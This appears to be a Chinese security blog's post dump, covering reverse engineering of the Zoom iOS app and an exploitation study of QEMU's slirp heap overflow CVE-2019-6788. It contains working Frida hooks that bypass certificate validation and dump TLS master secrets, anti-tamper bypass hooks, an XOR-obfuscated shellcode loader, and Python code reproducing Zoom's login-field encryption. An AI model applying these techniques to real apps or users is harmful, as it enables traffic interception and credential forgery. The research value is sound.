{"pages":[],"posts":[{"title":"Zoom 简单分析","text":"最近闲来无事儿，找个app学习学习想起之前某个机缘巧合的情况下，与zoom的大佬们有过简单的交流。就它吧！ Zoom Version: iOS 5.6.1(172) 0x00 去除重打包检测相关直接使用MonkeyDev 重打包，提示‘LLVM Profile Error: “default.profraw”‘并直接退出 直接丢进ida中看， 有检测embedded.mobileprovision 文件，同时瞄到ptrace检测调试， 伪代码如下： 1234567891011121314v4 = objc_msgSend(&amp;OBJC_CLASS___NSBundle, &quot;mainBundle&quot;);v5 = objc_msgSend(v4, &quot;pathForResource:ofType:&quot;, CFSTR(&quot;embedded&quot;), CFSTR(&quot;mobileprovision&quot;));if ( objc_msgSend(v5, &quot;length&quot;) ) exit(0);v6 = (__int64)dlopen(0LL, 10);if ( v6 ){ v14 = (void *)v6; v15 = dlsym((void *)v6, &quot;ptrace&quot;); if ( v15 ) ((void (__fastcall *)(signed __int64, _QWORD, _QWORD, _QWORD))v15)(31LL, 0LL, 0LL, 0LL); v6 = dlclose(v14);}v16 = sub_1000356A0(v6, v7, v8, v9, v10, v11, v12, v13, v22, v23, v24); 绕过也很简单： 123456789101112%hook NSBundle- (NSString *)pathForResource:(NSString *)name ofType:(NSString *)ext{ if([name isEqualToString:@&quot;embedded&quot;] &amp;&amp; [ext isEqualToString:@&quot;mobileprovision&quot;]){ NSLog(@&quot;find embedded.mobileprovision...&quot;); return nil; }else{ return %orig(); }}%end 绕过以后却一直提示这个 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647Main Thread Checker: UI API called on a background thread: -[UIApplication applicationState]PID: 1829, TID: 61332, Thread name: com.apple.CoreMotion.MotionThread, Queue name: com.apple.root.default-qos.overcommit, QoS: 0Backtrace:4 libobjc.A.dylib 0x0000000224f1b6f4 &lt;redacted&gt; + 565 CoreMotion 0x000000022b695d9c CoreMotion + 2943006 CoreMotion 0x000000022b6962cc CoreMotion + 2956287 CoreMotion 0x000000022b6961dc CoreMotion + 2953888 CoreMotion 0x000000022b6c401c CoreMotion + 4833569 CoreMotion 0x000000022b6c4060 CoreMotion + 48342410 CoreFoundation 0x0000000225caa27c &lt;redacted&gt; + 2811 CoreFoundation 0x0000000225ca9b64 &lt;redacted&gt; + 27612 CoreFoundation 0x0000000225ca4e58 &lt;redacted&gt; + 227613 CoreFoundation 0x0000000225ca4254 CFRunLoopRunSpecific + 45214 CoreFoundation 0x0000000225ca4f88 CFRunLoopRun + 8415 CoreMotion 0x000000022b6c39f4 CoreMotion + 48178016 libsystem_pthread.dylib 0x0000000225922908 &lt;redacted&gt; + 13217 libsystem_pthread.dylib 0x0000000225922864 _pthread_start + 4818 libsystem_pthread.dylib 0x000000022592adcc thread_start + 4//------------------------2021-05-14 21:17:42.684256+0800 Zoom[2148:69541] old data has cpoied done=================================================================Main Thread Checker: UI API called on a background thread: -[UIApplication applicationState]PID: 2148, TID: 69718, Thread name: com.apple.CoreMotion.MotionThread, Queue name: com.apple.root.default-qos.overcommit, QoS: 0Backtrace:4 libobjc.A.dylib 0x0000000224f1b6f4 &lt;redacted&gt; + 565 CoreMotion 0x000000022b695d9c CoreMotion + 294300...2021-05-14 21:17:42.964460+0800 Zoom[2148:69718] [reports] Main Thread Checker: UI API called on a background thread: -[UIApplication applicationState]PID: 2148, TID: 69718, Thread name: com.apple.CoreMotion.MotionThread, Queue name: com.apple.root.default-qos.overcommit, QoS: 0Backtrace:4 libobjc.A.dylib 0x0000000224f1b6f4 &lt;redacted&gt; + 565 CoreMotion 0x000000022b695d9c CoreMotion + 2943006 CoreMotion 0x000000022b6962cc CoreMotion + 295628...(lldb) bt* thread #20, name = 'com.apple.CoreMotion.MotionThread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0) * frame #0: 0x0000000000000000 frame #1: 0x0000000105731a6c libMainThreadChecker.dylib`__ASSERT_API_MUST_BE_CALLED_FROM_MAIN_THREAD_FAILED__ + 812 frame #2: 0x0000000105731e0c libMainThreadChecker.dylib`checker_c + 412 frame #3: 0x00000001057316b0 libMainThreadChecker.dylib`trampoline_c + 76 frame #4: 0x00000001056f145c libMainThreadChecker.dylib`handler_start + 52 frame #5: 0x00000001056fce7c libMainThreadChecker.dylib`__trampolines + 47600 frame #6: 0x0000000224f1b6f4 libobjc.A.dylib`-[NSObject performSelector:] + 56 frame #7: 0x000000022b695d9c CoreMotion`___lldb_unnamed_symbol1461$$CoreMotion + 908...(phone's lldb) 对于强迫症来说可太难顶了，很快啊，我啪就给丫关了： 对抗 检测不放在start中，可以多点多次检测 检测重打包(检测调试状态 也类似) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//简单版本：__attribute__((constructor)) static void (*__result)();// 垃圾指令 // ...// __asm__(&quot;mov x0, #0\\\\n&quot;// &quot;mov x1, #0\\\\n&quot;// &quot;mov sp, x1\\\\n&quot;// &quot;mov x29, x1\\\\n&quot;// &quot;mov x30, x1\\\\n&quot;// &quot;mov w16, #1\\\\n&quot;// &quot;svc #0x80\\\\n&quot;);// 也可再加一些垃圾指令// char asd[]=&quot;\\\\xE0\\\\x03\\\\x08\\\\xAA\\\\x00\\\\x10\\\\x80\\\\xD2\\\\x01\\\\x10\\\\x80\\\\xD2\\\\x00\\\\x00\\\\x80\\\\xd2\\\\x01\\\\x00\\\\x80\\\\xd2\\\\x3f\\\\x00\\\\x00\\\\x91\\\\xfd\\\\x03\\\\x01\\\\xaa\\\\xfe\\\\x03\\\\x01\\\\xaa\\\\x30\\\\x00\\\\x80\\\\x52\\\\x01\\\\x10\\\\x00\\\\xd4&quot;;char dsa[]=&quot;\\\\xB5\\\\x56\\\\x5D\\\\xFF\\\\x55\\\\x45\\\\xD5\\\\x87\\\\x54\\\\x45\\\\xD5\\\\x87\\\\x55\\\\x55\\\\xD5\\\\x87\\\\x54\\\\x55\\\\xD5\\\\x87\\\\x6A\\\\x55\\\\x55\\\\xC4\\\\xA8\\\\x56\\\\x54\\\\xFF\\\\xAB\\\\x56\\\\x54\\\\xFF\\\\x65\\\\x55\\\\xD5\\\\x07\\\\x54\\\\x45\\\\x55\\\\x81\\\\x55&quot;;__attribute__((constructor)) static void* __objc_alloc(){ void* ptr=mmap(0, 0x100, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE , -1, 0); if (ptr == MAP_FAILED) { return nil; } memcpy(ptr, dsa, (sizeof(dsa)&lt;0x100?sizeof(dsa):0x99)); char* pptr=(char* )ptr; for (int k=0; k&lt;(sizeof(dsa)&lt;0x100?sizeof(dsa):0x99); k++) { pptr[k]=pptr[k]^0x55; } int i=mprotect(ptr, 0x100, PROT_EXEC); if (i!=0){ return nil; } __result=ptr; return __result;}__attribute__((constructor)) static void _stack_chk_success(){ __objc_alloc(); NSString* BASE_PATH = [[NSBundle mainBundle] bundlePath]; NSFileManager *myFileManager = [NSFileManager defaultManager]; NSDirectoryEnumerator *myDirectoryEnumerator = [myFileManager enumeratorAtPath:BASE_PATH]; for (NSString *path in myDirectoryEnumerator.allObjects) { NSData *data = [path dataUsingEncoding:NSUTF8StringEncoding]; NSString *base64String = [data base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];#if 1 //embedded.mobileconfig if ([base64String isEqualToString:@&quot;ZW1iZWRkZWQubW9iaWxlcHJvdmlzaW9u&quot;]){ // __result(); pthread_t thread; pthread_create(&amp;thread, NULL, __result, NULL); }#endif }} 最近看到一个开源库做安全性检测的https://github.com/securing/IOSSecuritySuite， 粗略看了下检测的还算OK，做开发的朋友们有没有用过的 &lt;wink～&gt; ETC： 其实除了重打包检测和反调试以外，还有越狱检测，但是越狱检测可以直接使用现有的工具（比如Liberty…）直接绕过，这里就不多说了。 0x01 抓包解决了相关检测问题后，就可以直接调试应用了。既然要看登陆过程，那么抓包就是不可避免的一个步骤。先尝试了直接使用frida hook ssl read/write ，结果什么也没有，就很郁闷。尝试使用Charles设置代理抓包，结果发现： 原来是存在证书校验，具体可以使用wireshark查看： 可以看出是在server hello 完成后客户端检测到证书不匹配，既然问题出在客户端，那么就还是好解决的，拿现成的工具比如ssl kill switch直接干掉就完了，完事收工。 哈哈哈哈，当然不可能这么简单，不然还写什么写。用了ssl kill switch 后也是不起作用的，然后又试了自己hook NSURLSession、Security等系列函数中的检测部分，结果也还是不行，我emo了家人们，多吓人呐。当时在这里卡了挺久，没想到什么原因，更别提解决办法了，就想着先用ida搜搜关键字看能不能找到些线索。 1. 明确无法抓包的原因在浏览字符串的时候看到了openssl相关关键字，然后搜了下，还挺多： 瞬间就有了点什么想法，立马扭头跟大哥JKSun请教一番。该说不说，大哥就是大哥，很快就帮我确认了我的想法，这丫静态编译的openssl进去，并非使用系统库，难怪各种hook都不起作用。同时还看到在项目目录下有curl7.74.0相关代码目录，这里留意下暂且不表。 2. 解决方式2.1 一些奇妙的知识HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。这里https的原理部分不打算细讲，简单说说SSL的握手部分，搞明白这部分是我们后面操作的基础。闲话不多说，先看张图： 这张图讲解了tls的握手流程，我们这里需要注意几点： client向server端发送ClientHello数据包（包含支持的ssl版本等基础信息，以及一个随机数 random_num_client） server端在收到ClientHello后会向client发送ServerHello数据包（包含最终使用ssl配置等相关信息、server的publicKey和证书，以及一个随机数 random_num_server（如果设置了双向校验相关选项，这里server还会向client发送ClientCertificateRequest，后续会校验）） client收到ServerHello相关信息后，会使用RSA或DH算法生成第三个随机数（称之为Premaster Secret）然后使用server的publicKey加密后发送给server端 client和server都知道这三个随机数，且PreMasterSecret 在传输过程中是加密的。利用这三个随机数生成MasterSecret进而生成后续数据传输中使用的SessionKey，我们用下面这张图来表示 想要解开https数据包，我们就得获得这个握手过程中的PreMasterSecret 或者是MasterSecret。 在握手过程中，除了交换random 生成（Pre）MasterSecret 之外，还有个重要的任务就是进行身份认证，也就是我们常说的证书校验。身份认证也分两种：单向认证和双向认证，一般情况下只需要进行单向认证也就是client确认server的身份即可，对于一些重要的业务场景则需要client和server互相确认身份。 2.2 具体方式自己编译一份对应版本的openssl库，通过特征比对找到对应函数，尔后便可以解决抓包。机灵的小伙伴可以使用ida的sdk生成对应的sig文件，然后就可以直接识别了，我当时好像不太聪明的样子一个一个手动找的特征QaQ 结合上面奇妙的知识，我们可以用的方法就多，具体操作有： 通过hook获取master key 可以解开https的加密数据 –&gt; 可以直接使用wireshark 抓包 绕过证书校验部分， 用burp等工具可以直接抓包 –&gt; 通过burp等代理抓包工具抓包 hook ssl read/write 直接获取通讯数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105//0x01 get client_random, master_secretvar clientvar master// zoom_561_172// 0xB945B8// 先通过0xB61518 tls1_PRF 确定版本相关信息，再直接hook 获取master scretInterceptor.attach(base.add(0xB6176C), { onEnter: function (args) { var oob = Memory.readU64(args[0].add(0xa8)) client = oob.add(0xb8) master = args[1] }, onLeave: function (retval) { console.log(&quot;CLIENT_RANDOM&quot;, arraybuffer2hexstr(Memory.readByteArray(ptr(client), 32)), arraybuffer2hexstr(Memory.readByteArray(ptr(master), 48))) }})//0x02 bypass 证书校验//0x100B39B4C -- ssl_verify_cert_chain Interceptor.attach(base.add(0xB39B4C), { onEnter: function (args) { console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\\n') + '\\n'); console.log('call ssl_verify_cert_chain') }, onLeave: function (retval) { console.log(&quot;ret:&quot;, retval) retval.replace(1) }})function ssl_session_get_id_func(ssl, len) { if (len) { var lenn = Memory.readU64(ptr(ssl.add(0x150))) Memory.writeU32(len, lenn) } return ptr(ssl.add(0x158))}// ; SSL_SESSION *__cdecl SSL_get_session(const SSL *ssl)// __text:0000000000025E64 EXPORT _SSL_get_session// __text:0000000000025E64 _SSL_get_session ; CODE XREF: _SSL_copy_session_id+18↑p// __text:0000000000025E64 ; _ssl_validate_ct+D4↑p ...// __text:0000000000025E64 00 88 42 F9 LDR X0, [X0,#0x510]// __text:0000000000025E68 C0 03 5F D6 RET// __text:0000000000025E68 ; End of function _SSL_get_sessionfunction ssl_get_session_func(ssl) { return Memory.readU64(ssl.add(0x510))}function getSslSessionId(ssl) { var session = ssl_get_session_func(ssl); if (session == 0) { return 0; } var len = Memory.alloc(4); var p = ssl_session_get_id_func(session, len); len = Memory.readU32(len); var session_id = &quot;&quot;; for (var i = 0; i &lt; len; i++) { session_id += (&quot;0&quot; + Memory.readU8(p.add(i)).toString(16).toUpperCase()).substr(-2); } return session_id;}function arraybuffer2hexstr(buffer) { var hexArr = Array.prototype.map.call( new Uint8Array(buffer), function (bit) { return ('00' + bit.toString(16)).slice(-2) } ) return hexArr.join('');}// 0x05 SSL_read 0xB40E38 Interceptor.attach(base.add(0xB40E38), { onEnter: function (args) { this.message = &quot;SSL_read&quot; this.buf = args[1] console.log('call 0xB40E38 ssl_read', args[2]) console.log(&quot; -&gt; ssl_session_id is:&quot;, getSslSessionId(args[0])) }, onLeave: function (retval) { console.log(&quot;SSL_read ret:&quot;, retval) var byteArray = Memory.readByteArray(this.buf, parseInt(retval)) console.log(byteArray, '\\n') }})// 0x06 SSL_write 0xB40FECInterceptor.attach(base.add(0xB40FEC), { onEnter: function (args) { //bad command console.log('call 0xB40FEC ssl_write', args[0], args[2]) console.log(&quot; -&gt;ssl_session_id is:&quot;, getSslSessionId(args[0])) var byteArray = Memory.readByteArray(args[1], parseInt(args[2])) console.log(byteArray) }, onLeave: function (retval) { console.log(&quot;SSL_Write ret:&quot;, retval, '\\n') }}) 经过测试三种方式都是可以正常抓包的，这里贴一下抓包内容： 通过zoom.com 重定向到zoom.us，但是抓包的内容是一样的。下面我们就登陆部分做个简单分析 0x02 登陆字段分析登陆字段的计算部分都是用的C++写的，对这种无符号的代码，分析起来也没什么技巧，就是头铁。在识别加密算法的时候，由于经验不足，就直接上搜索引擎上去搜关键变量，然后结合openssl源码找特征。 总之能hook的就hook，不能hook的再调试分析。 通过捕获的数据包可以看到login相关字段如下： ZM-CID==deviceId==cid==hash_macaddress Cookies ==&gt;ZM-SESS-KEY + srid(SaaSbeeTestMode00123578) password ecp ZM-DID 在分析这些字段之前，我们还需要一个小tips，zoom中使用了自定义的string结构，姑且命名为CmmCstringT，结构大致如下 1234567891011121314151617181920// --------------------------------------------------// |00|01|02|03|04|05|06|07|08|09|0a|0b|0c|0d|0e|0f|// --------------------------------------------------// addr Cmm::CStringT | str or ptr2str// len | |flagQWORD *__fastcall Cmm_CStringT(_QWORD *a1, __int64 a2){ _QWORD *v2; // x20 v2 = a1; *a1 = &amp;off_10268E010; a1[1] = 0LL; a1[2] = 0LL; a1[3] = 0LL; if ( a2 ) std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::assign(); return v2;} 我们hook这个Cmm_CStringT函数，可以得到蛮多有趣的消息。 hash_macaddress对于hash_macaddress字段直接hook 对应关键字即可分析出流程， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960void __fastcall generateDeviceIdentifier(void *bundleIdentifier){ void *v1; // x19 __int64 v2; // x22 char *v3; // x19 void **v4; // [xsp+10h] [xbp-150h] __int64 v5; // [xsp+18h] [xbp-148h] __int64 (__fastcall *v6)(); // [xsp+20h] [xbp-140h] void *v7; // [xsp+28h] [xbp-138h] __int64 *v8; // [xsp+30h] [xbp-130h] __int64 v9; // [xsp+38h] [xbp-128h] __int64 *v10; // [xsp+40h] [xbp-120h] __int64 v11; // [xsp+48h] [xbp-118h] void *v12; // [xsp+50h] [xbp-110h] __int64 v13; // [xsp+58h] [xbp-108h] char v14[16]; // [xsp+C0h] [xbp-A0h] __int128 v15; // [xsp+D0h] [xbp-90h] __int128 v16; // [xsp+E0h] [xbp-80h] __int128 v17; // [xsp+F0h] [xbp-70h] char v18; // [xsp+100h] [xbp-60h] char v19[32]; // [xsp+108h] [xbp-58h] if ( bundleIdentifier ) { v1 = bundleIdentifier; if ( objc_msgSend(bundleIdentifier, &quot;length&quot;) ) { v9 = 0LL; v10 = &amp;v9; v11 = 584383987712LL; v12 = &amp;unk_10249643D; CC_SHA256_Init(&amp;v13); v4 = _NSConcreteStackBlock; v5 = 0xC2000000LL; v6 = sub_100312B08; v7 = &amp;unk_102697FC0; v8 = &amp;v9; objc_msgSend(v1, &quot;enumerateByteRangesUsingBlock:&quot;, &amp;v4); CC_SHA256_Final(); v2 = 0LL; v18 = 0; v16 = 0u; v17 = 0u; *(_OWORD *)v14 = 0u; v15 = 0u; v3 = v14; do { __sprintf_chk(v3, 0, 0xFFFFFFFFFFFFFFFFLL, &quot;%02x&quot;, (unsigned __int8)v19[v2++]); v3 += 2; } while ( v2 != 32 ); v18 = 0; objc_msgSend(&amp;OBJC_CLASS___NSString, &quot;stringWithUTF8String:&quot;, v14); _Block_object_dispose(&amp;v9, 8); } }}----&gt; +[ZPLogHelper infoLog:withString] UIDevice getDeviceIdentifier from DB/Keychain: a2458afb3e281029a1b9635b0e271d1301e246176b4e8710666ad4bd70866f37通过对base64指定结果进行栈回溯可以看到调用流程，以及加密deviceid的位置sub_1013F7BA4 这里直接写结果： 第一次使用app， 生成DeviceIdentifier，存入keychain/DB， 后续都直接取这个值使用 123456# 第一次启动app的时候，使用这种方式生成iddef gen_identifier(bundleid): _str=str(uuid.uuid1())+bundleid _out=hashlib.sha256(_str.encode()).hexdigest() print (_out) return _out 计算hash_macaddress 字段的值 1234567891011# 这个identifier 是可以直接从keychain 中读取的， 利用keychain_dumper 或 frida # 从keychain 中读取64位字符的id当作字符串传入即可def compute_hash_macaddress(identifier): if isinstance(identifier, str): identifier = identifier.encode() a=hashlib.sha256(identifier).hexdigest() b=hashlib.sha256(bytes.fromhex(a)).hexdigest() c=hashlib.sha256(bytes.fromhex(b)).hexdigest() result=base64.b64encode(bytes.fromhex(c)) print (result) return result ZM-SESS-KEY ==》读取hash_macaddress的值，将‘+’‘=’等符号转义，再拼接一个32位的随机字节数组 计算拼接后的内容的sha256，记作_input 使用内置公钥，RSA加密_input，得到密文 _encd 将 _encd base64编码，再拼接’,v1’，得到最终数据，用作Cookie中的ZM-SESS-KEY 字段，再拼接一些常量即可 123456789101112131415def RSA_enc(): a=compute_hash_macaddress(DEVICE_ID) # b=random.randbytes(32) b = bytes([random.randrange(0, 256) for _ in range(0, 32)]) _in=a+b # print (&quot;_in:&quot;, _in, type(_in)) c=hashlib.sha256(_in).hexdigest() # 记住这个sha256 的值 PASSWD_KEY=c print (c) _rsa_encd=openssl_rsa_enc(c) _out=base64.b64encode(_rsa_encd) _out=_out+b',v1' _out=quote(_out.decode()) print(_out) passwordpassword和ecp字段使用的方式都是一样的，取一个key来加密我们输入的password，ecp的key 是生成的一个udid。 但是passwprd字段的key却让我一通好找，最终使用的方式是在进入函数分配好内存（new(0xC28uLL)) 后便对存储key的区域下内存写入断点，断下后再查看调用栈，最终明白使用的key便是计算ZM-SESS-KEY 字段时的加密数据明文。 ==》 使用计算Cookie字段中的_input 当作是AES 加密使用的key 将上面的key计算sha256，所得结果用作aes_key，将aes_key计算hash用作iv iv长度与分块大小一致，恒为16， 使用的aes加密模式为aes_128_cbc，所以aes_key 实际上为sha256(_input)[0:16] 12345678910111213141516def AES_enc(_key, _passwd): if isinstance(_key, str): _key=_key.encode('utf-8') _aes_key=hashlib.sha256(_key).hexdigest() # print (_aes_key) _aes_iv=hashlib.sha256(bytes.fromhex(_aes_key)).hexdigest() # print (_aes_iv) cipher=AES.new(bytes.fromhex(_aes_key)[0:16], AES.MODE_CBC,bytes.fromhex(_aes_iv)[0:16]) x=__BLOCK_SIZE_16 - (len(_passwd) % __BLOCK_SIZE_16) if x!=0: _passwd=_passwd+chr(x)*x _enc = cipher.encrypt(_passwd) _out=base64.b64encode(_enc) print(_out) return _out 看到这里，很明显的数据使用对称加密算法加密、密钥使用非对称算法加密。 脚本丢在GitHub上了。 0x03 “加入会议” 功能分析参考链接 frida 官方文档 LLDB常用命令–飘云整理 openssl evp 对称加密(AES_ecb,ccb) Openssl Doc 图解SSL/TLS协议 SSL/TLS原理详解 Transport Layer Security (TLS) Session Hash andExtended Master Secret Extension SSL/TLS协议详解 C++ OpenSSL Verify X509 Certificate IoT设备逆向工程中的函数识别","link":"/2021/07/03/Zoom-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"},{"title":"about","text":"Noobs Security Researcher Foucs on iOS,IOT,Linux CONTACT MEEmail: vlinkstone@gmail.com","link":"/2020/02/02/about/"},{"title":"cve-2019-6788 Note","text":"最近看到一个思路很妙的qemu堆溢出利用实例，跟着调试学习了一波，在这里总结记录一下。 漏洞说明 漏洞本身不复杂，作者也把poc和exp的源代码都放出来了，所以跟着学习就比较容易。漏洞存在于qemu中的网络模块slirp中，在对Ident协议进行模拟时，没有进行有效的数据验证，从而导致溢出。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//qemu/slirp/tcp_subr.cinttcp_emu(struct socket *so, struct mbuf *m){ ... switch(so-&gt;so_emu) { int x, i; case EMU_IDENT: /* * Identification protocol as per rfc-1413 */ { struct socket *tmpso; struct sockaddr_in addr; socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv; memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len; m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */ if (strchr(m-&gt;m_data, '\\r') || strchr(m-&gt;m_data, '\\n')) { ... so_rcv-&gt;sb_cc = snprintf(so_rcv-&gt;sb_data, so_rcv-&gt;sb_datalen, &quot;%d,%d\\r\\n&quot;, n1, n2); so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data; so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc; } m_free(m);//crash return 0; }struct sbuf { uint32_t sb_cc; /* actual chars in buffer */ uint32_t sb_datalen; /* Length of data */ char *sb_wptr; /* write pointer. points to where the next * bytes should be written in the sbuf */ char *sb_rptr; /* read pointer. points to where the next * byte should be read from the sbuf */ char *sb_data; /* Actual data */};struct mbuf { /* XXX should union some of these! */ /* header at beginning of each mbuf: */ struct mbuf *m_next; /* Linked list of mbufs */ struct mbuf *m_prev; struct mbuf *m_nextpkt; /* Next packet in queue/record */ struct mbuf *m_prevpkt; /* Flags aren't used in the output queue */ int m_flags; /* Misc flags */ int m_size; /* Size of mbuf, from m_dat or m_ext */ struct socket *m_so; caddr_t m_data; /* Current location of data */ int m_len; /* Amount of data in this mbuf, from m_data */ Slirp *slirp; bool resolution_requested; uint64_t expiration_date; char *m_ext; /* start of dynamic buffer area, must be last element */ char m_dat[];}; 根据代码的逻辑，会先将mbuf中的数据拷贝至sbuf中，修改读写指针，之后只有当data中存在’\\r’或’\\n’的时候才会对sbuf中的sb_cc字段（也就是记录sbuf中实际字符长度的）进行累加，如果没有’\\r’’\\n’则不会增加sb_cc。再看一下判断内存空间部分的代码： 1234567891011else if (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp; tcpfrag_list_empty(tp) &amp;&amp; ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) { ... /* * Add data to socket buffer. */ if (so-&gt;so_emu) { if (tcp_emu(so,m)) sbappend(so, m); #define sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc) 如此便造成一种情况，当data中没有分隔符时，sb_cc 不会变，会一直向m_data，最终造成溢出。可以根据提供的poc测试： 123456789101112131415161718pwndbg&gt; break qemu/slirp/tcp_subr.c:638pwndbg&gt; cpwndbg&gt; p so_rcv-&gt;sb_datalen $1 = 8760 &lt;------ so_rcv 中data的大小为8760， 0x2238，记住这个数字pwndbg&gt; p so_rcv-&gt;sb_cc$2 = 0pwndbg&gt; p so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)$3 = 8760...pwndbg&gt; p so_rcv-&gt;sb_cc$5 = 0pwndbg&gt; p so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)$6 = 7480...pwndbg&gt; p so_rcv-&gt;sb_datalen - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)$11 = -200 # 到这里已经溢出了pwndbg&gt; p so_rcv-&gt;sb_cc$12 = 0 利用分析12345678910pwndbg&gt; checksec [*] '/home/x/Documents/iot/tools/qemu/qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ✗ cat /proc/sys/kernel/randomize_va_space2 在知道存在堆溢出后，在保护全开的情况下我们想要利用起来，有几个先决条件需要满足： 让堆的内存分配可以被我们控制 有办法将payload写入对应内存地址，即需要存在任意地址写 开了PIE（aslr plus）且级别为2，得有信息泄漏获取对应的基址 获得程序的控制权，让程序能够执行我们的代码 让heap变得可控通过pwndbg可以查看当前qemu中的heap，三个屏幕装不下…并且根据poc 调试的时候看到发生溢出的buf前后内存是不确定的。这种情况下找free可能不太靠谱，找malloc原语更适合些。 exp中找的是qemu在实现ip分段机制中的一处malloc，很是巧妙。先复习一下IP的分段机制： 123456789101112131415 0 1 2 3 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|Version| IHL | DSCP | ECN | Total Length |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Identification |Flags| Fragment Offset |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Time to Live | Protocol | Header Checksum |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Source Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Destination Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Options(if IHL&gt;5) |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 在IPv4中，IP分片存在于两个mtu不一样的网络之间传输数据，如果一个较大的packet想传输到一个mtu较小的网络中，那么就需要将这个packet分片后再发送，在IP头中就有专门的字段来满足这一需求。这里关注Flags和Fragment Offset字段即可， flags 字段分为仨：Reserved、Don’t fragment、More fragments Don’t fragment (DF)：表示这个数据包是否是分片的，1表示未分片0表示分片 More fragment (MF)：置1表示后面还有数据包，0则是最后一个，且当Don’t fragment字段为0时有效 Fragment Offset：表示当前数据包在完整的数据包中的偏移 看一下slirp中对分片的处理： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* * Ip input routine. Checksum and byte swap header. If fragmented * try to reassemble. Process options. Pass to next level. */voidip_input(struct mbuf *m){ ... if (ip-&gt;ip_off &amp;~ IP_DF) { ... if (ip-&gt;ip_off &amp; IP_MF) //&lt;------------------ 0 ip-&gt;ip_tos |= 1; else ip-&gt;ip_tos &amp;= ~1; ip-&gt;ip_off &lt;&lt;= 3; if (ip-&gt;ip_tos &amp; 1 || ip-&gt;ip_off) { ip = ip_reass(slirp, ip, fp); //&lt;---------------- 1 if (ip == NULL) return; m = dtom(slirp, ip); } else if (fp) ip_freef(slirp, fp); ... /* * Switch out to protocol's input routine. */}static struct ip *ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp){ ... m-&gt;m_data += hlen; m-&gt;m_len -= hlen; /* * If first fragment to arrive, create a reassembly queue. */ if (fp == NULL) { struct mbuf *t = m_get(slirp); //&lt;----------------- 2 ...}struct mbuf *m_get(Slirp *slirp){ ... if (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) { m = g_malloc(SLIRP_MSIZE); //&lt;--------- 3 slirp-&gt;mbuf_alloced++; if (slirp-&gt;mbuf_alloced &gt; MBUF_THRESH) flags = M_DOFREE; m-&gt;slirp = slirp; } else { m = (struct mbuf *) slirp-&gt;m_freelist.qh_link; remque(m); }...} 可以看到当DF=0 &amp;&amp; MF=1的时候，会调用ip_reass 函数重组数据包，ip_reass 中会调用g_malloc分配空间存储当前数据包的数据，并且如果ip_reass返回NULL时表示当前数据包并非last one，这样这个数据包就不会被下面的逻辑处理， 直接return。所以我们可以通过发送DF=0 &amp;&amp; MF=1的数据包来任意分配内存，SLIRP_MSIZE的值通过调试得知为0x675。 1234567pwndbg&gt; p m$4 = (struct mbuf *) 0x7fafb81f62f0pwndbg&gt; x/8gx 0x7fafb81f62f0-0x100x7fafb81f62e0: 0x0000000000000000 0x00000000000006750x7fafb81f62f0: 0x00007fafb80005a0 0x00007fafb80005a00x7fafb81f6300: 0x00007fafb81f62e0 0x00007fafb81f62e00x7fafb81f6310: 0x00000000bfbc5000 0x0000000000001000 任意地址写任意地址写也是用的ip分段机制中的实现，在重组ip数据包时，会将所有的数据包组合到一起，每个数据包都是通过mbuf结构来管理： 